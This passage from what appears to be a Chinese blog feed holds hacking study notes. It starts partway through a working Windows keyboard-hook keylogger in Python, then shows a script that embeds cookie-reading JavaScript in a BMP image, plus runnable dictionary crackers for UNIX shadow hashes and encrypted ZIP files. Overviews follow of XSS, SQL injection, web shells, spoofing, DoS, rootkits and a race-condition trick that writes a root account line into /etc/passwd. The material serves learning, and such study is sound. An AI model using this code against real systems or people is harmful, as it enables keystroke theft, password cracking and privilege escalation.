class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>KeyLogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''传递消息：GetMessageA()函数监视队列'''</span><span class="token keyword">def</span> <span class="token function">startKeyLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg<span class="token operator">=</span>MSG<span class="token punctuation">(</span><span class="token punctuation">)</span>    user32<span class="token punctuation">.</span>GetMessageA<span class="token punctuation">(</span>byref<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#启动消息钩取</span>keyLogger<span class="token operator">=</span>KeyLogger    <span class="token comment" spellcheck="true">#start of hook process</span>pointer<span class="token operator">=</span>getFPTR<span class="token punctuation">(</span>hookProc<span class="token punctuation">)</span><span class="token keyword">if</span> keyLogger<span class="token punctuation">.</span>installHookProc<span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"installed keyLogger"</span><span class="token punctuation">)</span>startKeyLog<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="六、图片文件攻击"><a href="#六、图片文件攻击" class="headerlink" title="六、图片文件攻击"></a>六、图片文件攻击</h2><ul><li><p>向图片（BMP）文件中插入JavaScript脚本，实现对Cookie的读写操作</p></li><li><p>创建hello.bmp，用WinHex打开图片文件，可看到前2字节是“魔数”，用于标识位图文件。0x42、0x4D分别对应字母B和M的ASCII码。随后的4字节整数用于指示BMP文件的大小，单位为字节</p></li><li><p>图片文件攻击机制<br><img src="https://www.hualigs.cn/image/60534b2952afa.jpg" alt=""></p></li><li><p>浏览器可以生成并保存Cookie。Cookie是保存在PC中供浏览器使用的短小信息。浏览器将Cookie保存到自身内存空间或保存为文件，保存用户登录信息与会话信息时。如果黑客窃取了Cookie，就可以将其用于多种攻击</p></li><li><p>Cookie以名称=值对的形式保存。示例中，将name=’id’与value=’Jack’保存到Cookie，示例中设置有效期为7天，最后添加脚本，将Cookie内容显示到警告窗口</p></li><li><p>要插入位图文件的脚本hello.js</p></li></ul><pre class=" language-python"><code class="language-python">name<span class="token operator">=</span><span class="token string">'id'</span><span class="token punctuation">;</span>value<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">;</span>var todayDate<span class="token operator">=</span>new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>todayDate<span class="token punctuation">.</span>setHours<span class="token punctuation">(</span>todayDate<span class="token punctuation">.</span>getDate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>cookie<span class="token operator">=</span>name<span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span>escape<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">";path=/;expires="</span> <span class="token operator">+</span>todayDate<span class="token punctuation">.</span>toGMTString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">;</span>alert<span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>向位图文件插入脚本的Python程序</li><li>向位图文件插入了脚本，位图文件大小有所增加，肉眼查看图片质量无明显变化。若使用WinHex之类的编辑器打开位图文件，可以看到图片文件所做的修改</li><li>编写简单的HTML文件，嵌入显示已含有脚本的位图文件</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>显示图像<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"hello.bmp"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>运行脚本<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></code></pre><p>3/18/2021 9:04:09 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统基础</title>
      <link href="2021/03/16/ji-suan-ji-xi-tong-ji-chu/"/>
      <url>2021/03/16/ji-suan-ji-xi-tong-ji-chu/</url>
      
        <content type="html"><![CDATA[<h3 id="1-进程内存映像"><a href="#1-进程内存映像" class="headerlink" title="1.进程内存映像"></a>1.进程内存映像</h3><ul><li>代码区：包含组成可执行文件的各种命令，保存着函数、控制语句、常数等，在进程创建时保存一次，直到进程销毁。代码区为只读区域，不可执行写入操作</li><li>数据与BSS区：保存着全局变量、静态常量、数组、结构体等。在进程创建时分配空间，进程运行时存入值。这两个区域都是可读写的<br>堆区：该区域是事先预约的空间，供进程运行时使用。程序员调用API可以分配任意大小内存。一般调用malloc()或calloc()函数进行分配，调用free()函数进行释放</li><li>栈区：程序自动使用的临时内存区域，用于保存局部变量的值，在函数调用时分配，函数退出时返还。堆与栈内存分配于相同空间。堆从低地址到高地址分配内存，栈从高地址向低地址分配内存，它们是系统黑客攻击的主要目标。在main()函数中，按照参数、返回地址、帧指针、局部变量顺序压入栈<br><img src="https://www.hualigs.cn/image/6050c8b9bf973.jpg" alt=""></li></ul><h3 id="2-应用程序"><a href="#2-应用程序" class="headerlink" title="2.应用程序"></a>2.应用程序</h3><ul><li>对使用编译型语言编写的程序，要采用黑盒方式探测漏洞进行黑客攻击。因为我们无法通过反编译方式得到程序源代码进行分析，只能通过输入不同值观察进程行为以进行黑客攻击</li><li>解释型语言程序，可以直接通过分析源代码寻找程序漏洞，这成为“白盒漏洞分析技术”</li></ul><h3 id="3-Web"><a href="#3-Web" class="headerlink" title="3.Web"></a>3.Web</h3><ul><li>寻找漏洞以获取系统root权限，或者发动黑客攻击盗取重要信息时，最常用的技术就是Web技术。虽然防火墙、IPS、IDS等可以组织来自外部的大部分攻击，但在安全规则中，向外提供Web服务器的80端口却常被作为一个例外进行处理<br><img src="https://www.hualigs.cn/image/6050c8b9b959c.jpg" alt=""></li></ul><h3 id="4-HTTP"><a href="#4-HTTP" class="headerlink" title="4.HTTP"></a>4.HTTP</h3><ul><li>HTTP请求协议由协议头与协议体组成，协议头含有方法类型、请求URL等服务处理所需的各种信息，而协议体则包含表单参数，与用户输入值对应</li><li>HTTP响应协议大致由状态码、内容类型、响应内容组成，其中状态码指示响应状态，内容类型指出传送的数据类型，响应内容是要展现给用户的结果<br><img src="https://www.hualigs.cn/image/6050c8b9b926e.jpg" alt=""></li></ul><h3 id="5-Cookie与会话"><a href="#5-Cookie与会话" class="headerlink" title="5.Cookie与会话"></a>5.Cookie与会话</h3><ul><li>浏览器保存数据的空间，称为Cookie</li><li>目前只将简单的控制信息、会话ID信息保存于此。由于Cookie信息包含于HTTP协议头信息，所以可将其用作在客户端与服务器之间传递信息的手段</li><li>会话是保存用户信息的Web服务器对象</li><li>用户登录Web后，用户信息就会保存在会话之中，然后通过Cookie将会话ID传递给浏览器。Web服务器会使用通过HTTP头传递的会话ID（位于Cookie）判断是否是认证用户</li></ul><p>基于会话的认证系统：</p><ul><li>（1）创建会话：创建用于保存用户认证信息的会话。创建的会话由Web服务器管理，保存在Web服务器进程占用的内存中</li><li>（2）传送会话ID：创建会话时，会同时创建用于标识会话的ID。为了判断相应客户端是否已经认证，在HTTP响应的Set-Cookie字段异同传送会话ID</li><li>（3）保存会话ID：浏览器从HTTP响应头提取会话ID并添加到Cookie</li><li>（4）传送会话ID：请求服务时，浏览器会将所有Cookie值放入HTTP请求头的Cookie字段、并进行传送，其中也包含会话ID</li><li>（5）识别会话：Web服务器分析HTTP头，从中提取会话ID。然后根据相应ID从自身会话列表提取相应值，进行认证</li></ul><p><strong>例1：一个UNIX密码破解器</strong></p><ul><li><p>需要用标准库中的crypt模块的crypt()函数。传入密码和盐即可。用crypt()函数哈希一个密码试试，输入密码”egg”和盐”HX”，返回的哈希值是”HX9LLTdc/jiDE”，现在可以遍历整个字典，试图用常用的盐来匹配破解哈希密码</p></li><li><p>哈希密码的前两位就是盐的前两位，这里假设盐只有两位<br><img src="https://www.hualigs.cn/image/6050c8b89f867.jpg" alt=""></p></li><li><p>程序分两部分，一部分是打开字典，另一部分是哈希匹配密码</p></li><li><p>UNIX/Linux系统将密码存储在/etc/shadow文件中，提供了更安全的哈希散列算法SHA-512算法，Python标准库中hashlib模块提供了此算法，可以更新代码，破解SHA-512哈希散列加密算法的密码</p></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=UTF-8</span><span class="token comment" spellcheck="true">#暴力破解UNIX的密码，需要输入字典文件和UNIX的密码文件</span><span class="token keyword">import</span> crypt<span class="token keyword">def</span> <span class="token function">testPass</span><span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span><span class="token punctuation">:</span>    salt<span class="token operator">=</span>cryptPass<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#前两个字符</span>    dictfile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dictionary.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#打开字典文件</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> dictfile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        word<span class="token operator">=</span>word<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去行尾换行符，保留原始的字符，不去空格</span>        cryptWord<span class="token operator">=</span>crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>word<span class="token punctuation">,</span>salt<span class="token punctuation">)</span>        <span class="token keyword">if</span> cryptPass<span class="token operator">==</span>cryptWord<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Found Passed:'</span><span class="token punctuation">,</span>word<span class="token punctuation">)</span>            <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Password not found!'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    passfile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'passwords.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取密码文件 open('r/etc/shadow','r')</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> passfile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        user<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#前第一项</span>        cryptPass<span class="token operator">=</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Cracking Password For:"</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span>        testPass<span class="token punctuation">(</span>cryptPass<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>sqlmap模块（非标准库，sqlmap.org）提供了wordlist文件，解压后，得到的wordlist.txt（安转目录\data\txt\wordlist.tx_再解压）文件可以作为字典用于破解，包含大量常用密码超过120万个，10+MB</li></ul><p><strong>例2：ZIP文件密码破解</strong></p><ul><li>Python的标准库提供了ZIP文件的提取压缩模块zipfile，现在试用此模块暴力破解出加密的ZIP文件</li><li>可以用extractall()这个函数抽取文件，密码正确则返回正确，密码错误则抛出异常</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">extractFile</span><span class="token punctuation">(</span>zFile<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        zFile<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>password<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#extractall(pwd=password.encode('ascii'))</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Foune Passwd:"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">return</span> password    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zFile<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'unzip.zip'</span><span class="token punctuation">)</span>    passFile<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dictionary.txt'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> passFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        password<span class="token operator">=</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>extractFile<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>zFile<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token triple-quoted-string string">''' 单线    guess=extractFile(zFile,password)    if guess:        print('Password=',password)        return    else:        print("can't find password")        return    '''</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/16/2021 11:06:45 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>黑客攻击技术</title>
      <link href="2021/03/15/hei-ke-gong-ji-ji-zhu/"/>
      <url>2021/03/15/hei-ke-gong-ji-ji-zhu/</url>
      
        <content type="html"><![CDATA[<ul><li>系统攻击针对的是计算机内核，可以侵入计算机内核管理的内存、注册表等区域，非法获取其中数据或root权限</li><li>应用程序攻击是围绕用户运行的程序实施的攻击。通过向应用程序注入包含恶意代码的DLL或调试操作，拦截用户的键盘输入</li><li>Web攻击利用网络浏览器与Web服务器的结构漏洞实施黑客攻击，是目前常用的攻击技术</li><li>网络黑客攻击基于网络实施黑客攻击，包括常见的DoS攻击、网络包嗅探（Spoofing）等</li><li>此外，还有无线网络攻击与其他黑客攻击技术<br><img src="https://www.hualigs.cn/image/604f72e460616.jpg" alt=""></li></ul><h1 id="一、应用程序攻击"><a href="#一、应用程序攻击" class="headerlink" title="一、应用程序攻击"></a>一、应用程序攻击</h1><ul><li>计算机中有许多安全解决方案。比如键盘安全解决方案，对键盘输入与屏幕输出之间传送的数据进行加密。黑客攻击使用的键盘记录器也采用了类似原理，系统内核提供的消息钩取功能。键盘输入由系统内核进行感知，在中间拦截消息。</li><li>开发应用程序时，调试器是必需的工具。发生特定事件或调用API时，调试器会暂停正在执行的操作，转而运行其他功能或记录内存状态。黑客也可以使用它诱导系统运行恶意代码。</li></ul><h1 id="二、应用程序攻击技术"><a href="#二、应用程序攻击技术" class="headerlink" title="二、应用程序攻击技术"></a>二、应用程序攻击技术</h1><p><strong>1.消息钩取</strong></p><ul><li>使用user32.dll中的SetWindowsHookExA()</li><li>Windows通过钩链（HookChain，处理消息的一系列函数指针的列表）处理来自键盘、鼠标等设备的消息</li><li>可将特定处理进程的指针强行注册到钩链，这样消息到来时即可对其进行特定处理</li><li>键盘记录器是最具代表性的攻击技术，采用消息钩取方式，在中间窃取用户的键盘输入消息，然后将之发送给黑客</li></ul><p><strong>2.API钩取</strong></p><ul><li>API钩取技术利用了操作系统提供的调试进程</li><li>首先使用调试器，在应用程序特定的命令位置设置断点，注册特定方法以便执行</li><li>应用程序运行过程中，遇到断点就会执行之前注册的方法（回调方法），黑客只要在回调方法中植入攻击代码即可执行相应动作</li></ul><p><strong>3.DLL注入</strong></p><ul><li>将动态链接库DLL插入特定应用程序</li><li>使用注册表，具体做法是现在注册表特定位置输入指定DLL名称，应用程序调用user32.dll时，指定DLL就会被加载到内存</li><li>注册钩取函数，以便特定事件发生时加载指定DLL</li><li>为运行中的应用程序创建远程线程以插入DLL。Windows中，CreateRemoteThread()函数用于创建远程线程</li></ul><p><strong>4.代码注入</strong></p><ul><li>与采用线程方式的DLL注入技术类似，不同之处在于，它插入的不是DLL，而是可以直接运行的shellcode</li><li>代码注入的优点是不需要事先将DLL保存到系统特定位置，并且执行速度快，不易被察觉</li><li>不足之处在于，shellcode自身特点决定了无法向其插入复杂的黑客攻击代码</li></ul><h1 id="三、Web攻击"><a href="#三、Web攻击" class="headerlink" title="三、Web攻击"></a>三、Web攻击</h1><ul><li>Web系统一般由网络浏览器、Web服务器、数据库三部分组成</li><li>黑客会恶意使用Web系统提供的功能</li><li>利用文件上传功能，将Webshell文件与恶意代码上传到Web服务器，然后运行Web shell文件，获取上传文件所在位置，进而控制Web服务器</li><li>利用用户输入功能可以实施SQL注入攻击，通过输入非正常SQL查询语句获取Web服务器的错误信息，并对这些信息加以分析，进而实施攻击</li><li>利用文件下载功能，可以将恶意代码散布到网络上的多台PC。网络浏览器中运行的THML与脚本代码可以被恶意用于开展XSS（跨站脚本）攻击与CSS（层叠样式表）攻击</li></ul><h1 id="四、Web攻击技术"><a href="#四、Web攻击技术" class="headerlink" title="四、Web攻击技术"></a>四、Web攻击技术</h1><p><strong>1.XSS（Cross-Site Scripting）攻击技术</strong></p><ul><li>将恶意代码植入到提供给其它用户使用的页面中。比如HTML页面和客户端脚本</li><li>感染浏览页面的用户PC，从中盗取用户个人信息、控制企业数据、挂马等。恶意代码大多数是脚本（JavaScript——公认的新型“ShellCode”），它读取cookie，并将其发送到特定URL</li><li>增强浏览器安全性，应用Web防火墙等应对</li></ul><p><strong>2.CSRF（Cross Site Request Forgery，跨站请求伪造）</strong></p><ul><li>也被称为“One Click Attack”或者“Session Riding”，通常缩写为CSRF或者XSRF</li><li>XSS利用站点内的信任用户，而CSRF则通过伪装受信任用户的请求来利用受信任的网站，对Web服务器发动攻击</li><li>CSRF攻击往往不大流行，难以防范<br><img src="https://www.hualigs.cn/image/604f72e66f246.jpg" alt=""></li></ul><p><strong>3.网络钓鱼（Phishing）</strong></p><p>黑客通过精心设计与银行、证券公司类似的仿冒网站（欺诈性邮件），骗取受害人在这些网站输入的金融信息或个人敏感信息</p><p><strong>4.域欺骗（Pharming）攻击</strong></p><p>黑客首先入侵DNS服务器，修改正常的域名与IP对照表，将仿冒网站的IP地址发送给用户浏览器，从而将用户引导至精心设计的仿冒网站</p><p><strong>5.SQL注入</strong></p><ul><li>利用HTML input标签发动攻击，以常见的登录处理过程为例说明</li><li>黑客向用户ID与密码框中输入的是一些能够诱使数据库产生错误行为的值。比如将类似OR 1=1输入并提交，服务器接收并构造SQL语句查询数据库，验证通过</li><li>黑客通过反复输入非正常的SQL语句，分析数据库返回的数据，从而得到最适合对系统进行攻击的SQL语句</li></ul><p><strong>6.Web shell攻击</strong></p><ul><li>恶意利用了Web提供的文件上传功能</li><li>将用于远程操纵服务器的Webshell文件上传到Web服务器，然后找到上传文件所在位置，得到访问Web shell文件的URL地址</li><li>然后，通过该URL地址运行Web shell文件，获取可以控制操作系统的超级权限</li></ul><h1 id="四、网络攻击"><a href="#四、网络攻击" class="headerlink" title="四、网络攻击"></a>四、网络攻击</h1><p>TCP/IP本质上并不具有防范攻击的能力，在连接设置与通信过程中有很多问题</p><ul><li>客户端初次尝试连接服务器时会向服务器发送SYN包，服务器将为该连接分配缓冲资源——若客户端不断向服务器发送SYN包，则服务器就会不断分配通信缓冲，缓冲全部耗尽后，服务器瘫痪</li><li>正常的通信连接结束后，黑客可以伪装成客户机拦截通信会话。一般使用TCP头中的序列号对通信对方进行认证，第三方可以轻松得到该序列号，并伪装相应客户机</li><li>IP头中的源IP信息很容易伪造。将源IP伪造为攻击方系统的IP而非客户机PC的IP并向服务器发送SYN包，服务器就会将ACK包发送给攻击方系统，从而实现Dos攻击</li></ul><h1 id="五、网络黑客攻击技术"><a href="#五、网络黑客攻击技术" class="headerlink" title="五、网络黑客攻击技术"></a>五、网络黑客攻击技术</h1><p><strong>1.端口扫描</strong></p><ul><li>IP是识别站点的逻辑地址，端口是逻辑单位，服务器对外开放的端口中最具代表性的是80,443（HTTPS），21（FTP），22（SSH），23（Telnet），25/110（SMTP/POP3），161（SNMP）…<ul><li>公认端口（Well-known Ports）：从0到1023</li><li>注册端口（Registered Ports）：从1024到49151，松散地绑定于一些服务</li><li>动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535.理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口，SUN的RPC端口从32768开始</li></ul></li><li>端口扫描是针对对外提供服务的服务器进行扫描，获取服务器对外开放的端口列表<ul><li>基于UDP的端口扫描通过UDP包扫描端口</li><li>基于TCP的端口扫描则通过SYN、FIN等多种包扫描端口，探测相应端口是否开放</li></ul></li></ul><p><strong>2.包嗅探</strong></p><ul><li>以太网的同一网络环境（使用同一路由器）中，数据包的传送是基于MAC地址进行的。一台PC向另一台PC传送数据时，会广播到同网段的所有PC</li><li>借助包嗅探技术，PC会接收并处理所有数据包。这样，同一网络中传播的所有数据可一目了然</li></ul><p><strong>3.会话劫持（Session Hijacking）攻击</strong></p><ul><li>大致分为HTTP会话劫持与TCP会话劫持两类。前者是指通过盗取保存服务认证信息的Cookie中的SessionID值进行黑客攻击，后者是指盗取TCP数据包信息</li><li>网络攻击中常见TCP会话劫持</li><li>TCP协议使用IP、Port、Sequence Number三个要素对通信对方进行认证 </li></ul><p>做法：</p><ul><li>先通过包嗅探获取认证信息，然后使用它在中间拦截客户机与服务器之间的通信</li><li>黑客暂时断开客户机与服务器之间的连接，将发送方IP修改为黑客PC的IP，重设与服务器的连接</li><li>在服务器看来，通信只是暂时发生了中断，然后再次成功连接，从而将黑客PC误认为客户机</li><li>客户机与黑客PC也采用类似方式设置连接。这样，客户机与服务器之间的所有通信都会经过黑客PC</li></ul><p><strong>4.欺骗（Spoofing）攻击</strong></p><ul><li>可以对DNS、IP、ARP(IP-&gt;MAC)进行欺骗攻击</li><li>ARP欺骗</li><li>PC内部有ARP缓存表，若在ARP缓存中查不到相应信息，则可以通过ARP协议获取指定IP对应的MAC</li><li>由于ARP协议在设计时未充分考虑安全问题，所以很容易受到攻击。只要使用ARP Reply包即可轻松操作对方的ARP缓存表</li><li>黑客将PC A与PC B对应的信息替换为自身PC的MAC地址后，所有通信都会经过黑客PC </li></ul><p><strong>5.DoS（Denial of Service）攻击</strong></p><ul><li>通过修改SYN数据包的发送方地址，或者不断发送SYN数据包，将大量IP数据包分割为更小的单位进行传送等，即可使系统服务陷入瘫痪</li><li>DoS攻击指通过发送大量的数据包使系统服务瘫痪 </li><li>使用少数几台PC发动DoS攻击使攻击目标系统服务瘫痪并非易事。黑客广泛散播病毒，将大量PC机变为僵尸PC（“肉鸡”），通过控制这些僵尸PC发送大量合法服务请求，以使目标主机服务瘫痪——DDoS</li><li>通过僵尸网络（Botnet）发动DDoS攻击仍然是非常有用的攻击手段。恶意代码可以通过电子邮件、公告栏、木马等多种方式进行传播</li><li>为了防范DDoS攻击，一般采用网络隔离，将业务网与互联网隔离，接入互联网的机器感染，影响范围也不会扩散到内网</li></ul><h1 id="六、系统攻击"><a href="#六、系统攻击" class="headerlink" title="六、系统攻击"></a>六、系统攻击</h1><p>利用计算机系统结构与功能漏洞非法盗取敏感信息，或者诱使计算机执行意想不到的功能。 </p><p><strong>1.Rootkit</strong></p><ul><li>获取目标主机的root权限，或者安装可以控制系统的后门</li><li>有用户模式、内核模式、引导模式三种类型</li><li>用户模式在应用程序级别工作，比较容易测出，对系统危害较低</li><li>内核模式下会向内核添加其它代码，或者直接用新代码替代原有代码。开发虽然有难度，但能够对系统造成致命损害</li><li>引导模式对MBR（Master Boot Record，主引导记录）、VBR（Volume Boot Record，卷引导记录）、引导扇区产生影响，能够对整个文件系统加密，或者使系统无法引导</li></ul><p><strong>2.后门</strong></p><p>后门是指可以远程控制用户PC的程序</p><p><strong>3.注册表攻击</strong></p><p>注册表是一种数据库，采用“键，值”的形式保存各种信息。可以通过接口CRUD（Create Read Update Delete）操作注册表，尝试初始化用户密码、修改防火墙设置、DLL注入等多种攻击</p><p><strong>4.缓冲区溢出攻击</strong></p><ul><li>通过向进程输入非正常数据，将黑客精心准备的数据保存到内存，并使之运行</li><li>进程运行时，相应的数据会进入其内存区域，如栈、堆以及寄存器。修改此类数据后，进程的处理顺序就会改变或者停止运行。黑客通过不断修改输入值，观察哪些数据会引发错误，以及在输入值的哪一部分植入shell code可以运行，最终编写攻击代码</li><li>缓冲区溢出攻击代码不是独立运行的程序，它是随视频、音乐、文档一起运行的程序文件</li><li>将含有错误代码的视频发布到网络，用户下载该视频后，在播放器中将视频文件打开的瞬间，其内部含有的shell code会使内存陷入异常，从而得以运行 </li></ul><p><strong>5.竞态条件攻击</strong></p><ul><li>竞态条件是指两个进程为了使用一种资源而彼此竞争的状况。多个进程同时写一个文件时，就需要相互竞争，以获得该文件的句柄。竞态条件攻击利用此过程中出现的安全漏洞发动攻击</li><li>最常用的方式是利用/etc/passwd文件的负号链接，etc/passwd文件保存着用户账户信息。首先，使用root权限获得用户输入，创建临时文件，查找用于处理逻辑的进程。黑客向该进程反复输入代表添加用户的值（hacker: :0:0:root:/root:/bin/ksh）。另一方面，运行程序，反复创建/etc/passwd文件的符号链接（与临时文件同名）。两个进程争夺文件句柄的过程中，进程会向符号文件链接保存用户输入。此时，hacker: :0:0:root:/root:/bin/ksh会被写入etc/passwd文件，最终黑客账户获得root权限</li></ul><h1 id="三、其他攻击技术"><a href="#三、其他攻击技术" class="headerlink" title="三、其他攻击技术"></a>三、其他攻击技术</h1><p><strong>1.无线局域网黑客攻击技术</strong></p><ul><li>通过无线AP使用WIFI，无线局域网认证合法用户，并采用WEP、WPA、WPA2等多种安全机制对传送的数据进行加密</li><li>WEP（Wired Equivalent Privacy，有线等效加密）RC4串流加密技术有缺陷</li><li>WPA（WiFi Protected Access WiFi保护接入） 提高了安全性，但最初认证过程中存在隐藏WPA密钥的漏洞。黑客能够强制终止认证的会话，诱导重新认证，从而轻松获取WPA密钥</li><li>WPA2使用AES-CCMP加密方法弥补WPA的缺点。虽然无法破解或盗取WPA2的加密密钥，但采用ARP欺骗方式可以窃取接入者的敏感信息。因此，需要使用WIPS（Wireless Intrusion Prevention System）等设备为无线局域网构建立体防御体系</li></ul><p><strong>2.密码攻击技术</strong></p><p>第三方不是合法的加密参与方，它通过非正常方法试图进行加密、解密，称为密码攻击</p><ul><li>密文单独攻击是指攻击者在只有密文的情形下找出明文与加密密钥，攻击难度最高</li><li>已知明文攻击是指攻击者在有密文与部分明文的情形下展开攻击</li><li>选择明文攻击是指攻击者在能够执行加密的状态下进行攻击</li><li>选择密文攻击是指攻击者在可以解密的状态下进行攻击</li><li>暴力破解攻击，使用所有可能的字符组合进行暴力破解。从事先定义的字典依次取值代入，以达到破解密码的目的</li></ul><p><strong>3.社会工程黑客攻击技术</strong></p><p>只能通过不断对雇员进行安全培训并提高其安全意识进行预防<br>3/15/2021 10:55:05 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python系统管理</title>
      <link href="2021/03/13/python-xi-tong-guan-li/"/>
      <url>2021/03/13/python-xi-tong-guan-li/</url>
      
